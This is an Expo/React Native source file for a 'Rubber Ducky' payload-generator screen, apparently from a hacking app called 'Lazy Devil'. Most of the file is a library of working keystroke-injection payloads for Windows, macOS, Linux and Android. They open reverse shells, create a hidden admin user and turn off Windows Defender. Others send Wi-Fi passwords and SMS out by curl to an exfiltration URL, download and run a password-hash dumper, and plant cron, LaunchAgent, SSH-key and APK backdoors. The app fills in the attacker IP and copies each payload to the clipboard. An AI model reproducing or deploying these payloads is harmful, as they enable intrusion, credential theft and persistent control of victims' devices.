import { Feather } from "@expo/vector-icons";
import * as Clipboard from "expo-clipboard";
import * as Haptics from "expo-haptics";
import React, { useState } from "react";
import {
  Modal,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import { useApp } from "@/context/AppContext";
import { useColors } from "@/hooks/useColors";

interface Payload {
  id: string;
  name: string;
  category: string;
  icon: keyof typeof Feather.glyphMap;
  description: string;
  risk: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  tags: string[];
  script: string;
}

const PAYLOADS: Payload[] = [
  // WINDOWS
  {
    id: "win-revshell",
    name: "Windows Reverse Shell",
    category: "WINDOWS",
    icon: "terminal",
    description: "PowerShell reverse shell to attacker IP",
    risk: "CRITICAL",
    tags: ["powershell", "reverse shell", "meterpreter"],
    script: `REM Lazy Devil - Windows Reverse Shell
REM Change LHOST and LPORT before deploying
REM ==========================================
DELAY 500
GUI r
DELAY 400
STRING powershell -w hidden -nop -ep bypass -c "$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ENTER`,
  },
  {
    id: "win-adduser",
    name: "Add Hidden Admin",
    category: "WINDOWS",
    icon: "user-plus",
    description: "Create hidden admin user silently",
    risk: "HIGH",
    tags: ["persistence", "privilege", "admin"],
    script: `REM Lazy Devil - Add Hidden Admin User
REM ======================================
DELAY 500
GUI r
DELAY 400
STRING cmd /c "net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add && net localgroup \"Remote Desktop Users\" hacker /add"
ENTER`,
  },
  {
    id: "win-wifi-harvest",
    name: "WiFi Password Dump",
    category: "WINDOWS",
    icon: "wifi",
    description: "Export all saved WiFi passwords silently",
    risk: "HIGH",
    tags: ["recon", "wifi", "credentials"],
    script: `REM Lazy Devil - WiFi Password Harvester
REM Change EXFIL_URL to your server
REM ========================================
DELAY 500
GUI r
DELAY 400
STRING cmd /c "for /f \"tokens=2 delims=:\" %i in ('netsh wlan show profiles^|find \"Profile\"') do @netsh wlan show profile name=%i key=clear 2>nul | find \"Key Content\" >> C:\\Users\\Public\\wifi.txt && curl -X POST https://EXFIL_URL -d @C:\\Users\\Public\\wifi.txt && del /f C:\\Users\\Public\\wifi.txt"
ENTER`,
  },
  {
    id: "win-disable-av",
    name: "Disable Windows Defender",
    category: "WINDOWS",
    icon: "shield-off",
    description: "Disable AV real-time protection via PowerShell",
    risk: "CRITICAL",
    tags: ["defense evasion", "av bypass", "powershell"],
    script: `REM Lazy Devil - Disable Windows Defender
REM =========================================
DELAY 500
GUI r
DELAY 400
STRING powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true; Add-MpPreference -ExclusionPath 'C:\\';"
ENTER`,
  },
  {
    id: "win-cred-dump",
    name: "Credential Dump",
    category: "WINDOWS",
    icon: "lock",
    description: "Dump SAM/LSA credentials via PowerShell",
    risk: "CRITICAL",
    tags: ["credentials", "mimikatz", "lsa"],
    script: `REM Lazy Devil - Credential Dumper
REM =================================
DELAY 500
GUI r
DELAY 400
STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1'); Get-PassHashes | Out-File C:\\Users\\Public\\hashes.txt"
ENTER`,
  },
  {
    id: "win-sysinfo",
    name: "System Recon Dump",
    category: "WINDOWS",
    icon: "cpu",
    description: "Enumerate system info, users, and network silently",
    risk: "MEDIUM",
    tags: ["recon", "enumeration", "osint"],
    script: `REM Lazy Devil - Windows System Recon
REM =====================================
DELAY 500
GUI r
DELAY 400
STRING cmd /c "(systeminfo && whoami /all && ipconfig /all && netstat -ano && arp -a && net user && net localgroup administrators) > C:\\Users\\Public\\recon.txt 2>&1"
ENTER`,
  },
  // MACOS
  {
    id: "mac-revshell",
    name: "macOS Reverse Shell",
    category: "MACOS",
    icon: "terminal",
    description: "Bash reverse shell to attacker IP",
    risk: "CRITICAL",
    tags: ["bash", "reverse shell", "persistence"],
    script: `REM Lazy Devil - macOS Reverse Shell
REM Change LHOST and LPORT
REM ===================================
DELAY 500
COMMAND SPACE
DELAY 400
STRING Terminal
ENTER
DELAY 800
STRING bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &
ENTER`,
  },
  {
    id: "mac-wifi-harvest",
    name: "macOS WiFi Harvest",
    category: "MACOS",
    icon: "wifi",
    description: "Extract saved WiFi passwords from keychain",
    risk: "HIGH",
    tags: ["wifi", "keychain", "credentials"],
    script: `REM Lazy Devil - macOS WiFi Password Extract
REM ============================================
DELAY 500
COMMAND SPACE
DELAY 400
STRING Terminal
ENTER
DELAY 800
STRING for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | sed 's/^\t//'); do security find-generic-password -wa "$ssid" 2>/dev/null; done > /tmp/wifi.txt; curl -X POST https://EXFIL_URL --data-binary @/tmp/wifi.txt; rm /tmp/wifi.txt
ENTER`,
  },
  {
    id: "mac-persistence",
    name: "macOS LaunchAgent",
    category: "MACOS",
    icon: "repeat",
    description: "Install persistent LaunchAgent for backdoor",
    risk: "HIGH",
    tags: ["persistence", "launchagent", "backdoor"],
    script: `REM Lazy Devil - macOS LaunchAgent Persistence
REM Change LHOST and LPORT
REM =============================================
DELAY 500
COMMAND SPACE
DELAY 400
STRING Terminal
ENTER
DELAY 800
STRING echo '<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.apple.update.plist && launchctl load ~/Library/LaunchAgents/com.apple.update.plist
ENTER`,
  },
  // LINUX
  {
    id: "linux-revshell",
    name: "Linux Reverse Shell",
    category: "LINUX",
    icon: "terminal",
    description: "Netcat/bash reverse shell",
    risk: "CRITICAL",
    tags: ["bash", "nc", "reverse shell"],
    script: `REM Lazy Devil - Linux Reverse Shell
REM Change LHOST and LPORT
REM ===================================
DELAY 500
STRING bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' &
ENTER`,
  },
  {
    id: "linux-ssh-key",
    name: "SSH Key Plant",
    category: "LINUX",
    icon: "key",
    description: "Inject attacker SSH public key for persistence",
    risk: "HIGH",
    tags: ["persistence", "ssh", "backdoor"],
    script: `REM Lazy Devil - SSH Key Persistence
REM ====================================
DELAY 500
STRING mkdir -p ~/.ssh && echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... lazy-devil" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ENTER`,
  },
  {
    id: "linux-cron",
    name: "Cron Persistence",
    category: "LINUX",
    icon: "clock",
    description: "Plant cronjob for reverse shell every minute",
    risk: "HIGH",
    tags: ["persistence", "cron", "reverse shell"],
    script: `REM Lazy Devil - Cron Persistence
REM Change LHOST and LPORT
REM ================================
DELAY 500
STRING (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'") | crontab -
ENTER`,
  },
  // ANDROID / NETHUNTER
  {
    id: "android-hid-sms",
    name: "Android HID SMS Exfil",
    category: "ANDROID",
    icon: "smartphone",
    description: "NetHunter HID: exfiltrate SMS via email",
    risk: "HIGH",
    tags: ["nethunter", "android", "hid", "sms"],
    script: `REM Lazy Devil - Android HID SMS Exfil
REM NetHunter HID attack on unlocked Android
REM ==========================================
DELAY 1000
REM Open Android terminal
STRING am start -n com.android.settings/.Settings
DELAY 500
REM Dump SMS to file
STRING content query --uri content://sms --projection address,body > /sdcard/sms.txt
ENTER
DELAY 500
STRING curl -X POST https://EXFIL_URL -d @/sdcard/sms.txt && rm /sdcard/sms.txt
ENTER`,
  },
  {
    id: "nethunter-backdoor",
    name: "NetHunter APK Backdoor",
    category: "ANDROID",
    icon: "package",
    description: "Generate & install msfvenom Android APK payload",
    risk: "CRITICAL",
    tags: ["nethunter", "android", "apk", "meterpreter"],
    script: `REM Lazy Devil - NetHunter Android Backdoor
REM ==========================================
REM Run on NetHunter Kali terminal first:
REM msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 R > evil.apk
REM
REM Then use ADB to install:
REM adb connect TARGET_IP
REM adb install evil.apk
REM
REM MSF handler:
REM use exploit/multi/handler
REM set PAYLOAD android/meterpreter/reverse_tcp
REM set LHOST YOUR_IP
REM set LPORT 4444
REM run`,
  },
  // CUSTOM
  {
    id: "custom", name: "Custom Script", category: "CUSTOM", icon: "edit-3",
    description: "Write your own DuckyScript payload",
    risk: "MEDIUM",
    tags: ["custom", "duckyscript"],
    script: `REM Lazy Devil - Custom DuckyScript
REM ====================================
REM DuckyScript Commands:
REM   DELAY <ms>     - Wait milliseconds
REM   STRING <text>  - Type text
REM   ENTER          - Press Enter
REM   GUI r          - Windows+R (Run dialog)
REM   CTRL ALT t     - Ctrl+Alt+T (Linux terminal)
REM   COMMAND SPACE  - Cmd+Space (Mac Spotlight)
REM   UP/DOWN/LEFT/RIGHT - Arrow keys
REM   SHIFT          - Shift modifier
REM ====================================
DELAY 1000
STRING Hello from Lazy Devil!
ENTER`,
  },
];

const CATEGORIES = ["ALL", ...Array.from(new Set(PAYLOADS.map(p => p.category)))];

const RISK_COLOR: Record<string, string> = {
  LOW: "#44bb44",
  MEDIUM: "#bbbb44",
  HIGH: "#bb4400",
  CRITICAL: "#cc0000",
};

export default function DuckyScreen() {
  const colors = useColors();
  const insets = useSafeAreaInsets();
  const { addTerminalLine } = useApp();
  const [category, setCategory] = useState("ALL");
  const [selected, setSelected] = useState<Payload | null>(null);
  const [script, setScript] = useState("");
  const [lhost, setLhost] = useState("10.10.14.1");
  const [lport, setLport] = useState("4444");
  const [copied, setCopied] = useState(false);

  const filtered = PAYLOADS.filter(p => category === "ALL" || p.category === category);

  const finalScript = script
    .replace(/LHOST/g, lhost)
    .replace(/LPORT/g, lport);

  const copy = async () => {
    await Clipboard.setStringAsync(finalScript);
    Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    addTerminalLine({ type: "success", content: `[+] Ducky payload copied: ${selected?.name}` });
  };

  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <Text style={styles.headerTitle}>🦆 RUBBER DUCKY</Text>
        <Text style={styles.headerSub}>DuckyScript Payload Generator · NetHunter</Text>
      </View>

      <ScrollView
        horizontal
        showsHorizontalScrollIndicator={false}
        style={styles.catRow}
        contentContainerStyle={{ gap: 6, paddingHorizontal: 10, paddingVertical: 8 }}
      >
        {CATEGORIES.map(cat => (
          <TouchableOpacity
            key={cat}
            style={[styles.catBtn, { borderColor: category === cat ? "#cc0000" : "#330000" },
              category === cat && { backgroundColor: "#0a0000" }]}
            onPress={() => setCategory(cat)}
          >
            <Text style={[styles.catText, { color: category === cat ? "#cc0000" : "#660000" }]}>{cat}</Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      <ScrollView
        contentContainerStyle={{ padding: 10, paddingBottom: insets.bottom + 100, gap: 8 }}
      >
        {filtered.map(payload => (
          <TouchableOpacity
            key={payload.id}
            style={[styles.card, {
              borderColor: selected?.id === payload.id ? "#cc0000" : "#220000",
              backgroundColor: selected?.id === payload.id ? "#0a0000" : "#030000",
            }]}
            onPress={() => {
              setSelected(payload);
              setScript(payload.script);
              Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
            }}
          >
            <View style={styles.cardTop}>
              <Feather name={payload.icon} size={18} color={RISK_COLOR[payload.risk]} />
              <View style={styles.cardMeta}>
                <Text style={styles.cardName}>{payload.name}</Text>
                <Text style={styles.cardCat}>{payload.category}</Text>
              </View>
              <View style={[styles.riskBadge, { backgroundColor: RISK_COLOR[payload.risk] + "22", borderColor: RISK_COLOR[payload.risk] }]}>
                <Text style={[styles.riskText, { color: RISK_COLOR[payload.risk] }]}>{payload.risk}</Text>
              </View>
            </View>
            <Text style={styles.cardDesc}>{payload.description}</Text>
            <View style={styles.tagRow}>
              {payload.tags.slice(0, 3).map(t => (
                <Text key={t} style={styles.tag}>#{t}</Text>
              ))}
            </View>
          </TouchableOpacity>
        ))}
      </ScrollView>

      <Modal visible={!!selected} transparent animationType="slide" onRequestClose={() => setSelected(null)}>
        <View style={styles.overlay}>
          <View style={styles.sheet}>
            <View style={styles.sheetHeader}>
              <View style={{ flex: 1 }}>
                <Text style={styles.sheetTitle}>{selected?.name}</Text>
                <Text style={styles.sheetDesc}>{selected?.description}</Text>
              </View>
              <TouchableOpacity onPress={() => setSelected(null)}>
                <Feather name="x" size={20} color="#660000" />
              </TouchableOpacity>
            </View>

            <View style={styles.row}>
              <View style={styles.fieldHalf}>
                <Text style={styles.fieldLabel}>LHOST (Attacker IP)</Text>
                <TextInput
                  style={styles.field}
                  value={lhost}
                  onChangeText={setLhost}
                  placeholder="10.10.14.1"
                  placeholderTextColor="#440000"
                  autoCapitalize="none"
                  autoCorrect={false}
                />
              </View>
              <View style={styles.fieldHalf}>
                <Text style={styles.fieldLabel}>LPORT</Text>
                <TextInput
                  style={styles.field}
                  value={lport}
                  onChangeText={setLport}
                  placeholder="4444"
                  placeholderTextColor="#440000"
                  keyboardType="numeric"
                />
              </View>
            </View>

            <Text style={styles.fieldLabel}>DUCKYSCRIPT PAYLOAD</Text>
            <ScrollView style={styles.scriptBox} nestedScrollEnabled>
              <TextInput
                style={styles.scriptInput}
                value={script}
                onChangeText={setScript}
                multiline
                autoCapitalize="none"
                autoCorrect={false}
                spellCheck={false}
                placeholder="DuckyScript here..."
                placeholderTextColor="#440000"
              />
            </ScrollView>

            <View style={styles.sheetActions}>
              <TouchableOpacity style={styles.previewBtn} onPress={() => {
                if (!selected) return;
                for (const l of finalScript.split("\n")) {
                  addTerminalLine({ type: "output", content: l });
                }
                setSelected(null);
              }}>
                <Feather name="terminal" size={13} color="#cc0000" />
                <Text style={styles.previewBtnText}>PREVIEW IN TERMINAL</Text>
              </TouchableOpacity>

              <TouchableOpacity style={[styles.copyBtn, copied && styles.copiedBtn]} onPress={copy}>
                <Feather name={copied ? "check" : "copy"} size={13} color="#000" />
                <Text style={styles.copyBtnText}>{copied ? "COPIED!" : "COPY PAYLOAD"}</Text>
              </TouchableOpacity>
            </View>

            <View style={styles.warning}>
              <Feather name="alert-triangle" size={12} color="#884400" />
              <Text style={styles.warningText}>
                For authorized testing only. Deploy via Hak5 Rubber Ducky, NetHunter HID, or similar.
              </Text>
            </View>
          </View>
        </View>
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1 },
  header: { paddingHorizontal: 12, paddingVertical: 10, borderBottomWidth: 1, borderBottomColor: "#220000" },
  headerTitle: { fontFamily: "monospace", fontSize: 16, fontWeight: "bold", color: "#cc0000", letterSpacing: 2 },
  headerSub: { fontFamily: "monospace", fontSize: 10, color: "#660000", marginTop: 2 },
  catRow: { borderBottomWidth: 1, borderBottomColor: "#1a0000", flexGrow: 0 },
  catBtn: { borderWidth: 1, paddingHorizontal: 10, paddingVertical: 4 },
  catText: { fontFamily: "monospace", fontSize: 9, fontWeight: "bold" },
  card: { borderWidth: 1, padding: 12 },
  cardTop: { flexDirection: "row", alignItems: "center", gap: 10, marginBottom: 6 },
  cardMeta: { flex: 1 },
  cardName: { fontFamily: "monospace", fontSize: 13, fontWeight: "bold", color: "#ff3333" },
  cardCat: { fontFamily: "monospace", fontSize: 9, color: "#660000", marginTop: 1 },
  riskBadge: { borderWidth: 1, paddingHorizontal: 6, paddingVertical: 2 },
  riskText: { fontFamily: "monospace", fontSize: 8, fontWeight: "bold" },
  cardDesc: { fontFamily: "monospace", fontSize: 11, color: "#880000", lineHeight: 16 },
  tagRow: { flexDirection: "row", gap: 6, marginTop: 6 },
  tag: { fontFamily: "monospace", fontSize: 9, color: "#440000" },
  overlay: { flex: 1, backgroundColor: "rgba(0,0,0,0.93)", justifyContent: "flex-end" },
  sheet: { backgroundColor: "#030000", borderTopWidth: 2, borderTopColor: "#cc0000", padding: 18, maxHeight: "92%" },
  sheetHeader: { flexDirection: "row", alignItems: "flex-start", justifyContent: "space-between", marginBottom: 14 },
  sheetTitle: { fontFamily: "monospace", fontSize: 15, fontWeight: "bold", color: "#ff3333", letterSpacing: 1 },
  sheetDesc: { fontFamily: "monospace", fontSize: 10, color: "#880000", marginTop: 3 },
  row: { flexDirection: "row", gap: 8, marginBottom: 10 },
  fieldHalf: { flex: 1 },
  fieldLabel: { fontFamily: "monospace", fontSize: 9, color: "#660000", marginBottom: 4 },
  field: {
    fontFamily: "monospace", fontSize: 12, color: "#ff3333",
    borderWidth: 1, borderColor: "#330000", padding: 8,
  },
  scriptBox: { maxHeight: 220, borderWidth: 1, borderColor: "#330000", marginBottom: 12, backgroundColor: "#000" },
  scriptInput: { fontFamily: "monospace", fontSize: 10, color: "#44ff44", padding: 8, lineHeight: 17, minHeight: 160 },
  sheetActions: { flexDirection: "row", gap: 8, marginBottom: 10 },
  previewBtn: {
    flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center",
    gap: 6, borderWidth: 1, borderColor: "#cc0000", padding: 10,
  },
  previewBtnText: { fontFamily: "monospace", fontSize: 10, fontWeight: "bold", color: "#cc0000" },
  copyBtn: {
    flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center",
    gap: 6, backgroundColor: "#cc0000", padding: 10,
  },
  copiedBtn: { backgroundColor: "#004400" },
  copyBtnText: { fontFamily: "monospace", fontSize: 10, fontWeight: "bold", color: "#000" },
  warning: { flexDirection: "row", alignItems: "flex-start", gap: 6 },
  warningText: { fontFamily: "monospace", fontSize: 9, color: "#884400", flex: 1, lineHeight: 13 },
});
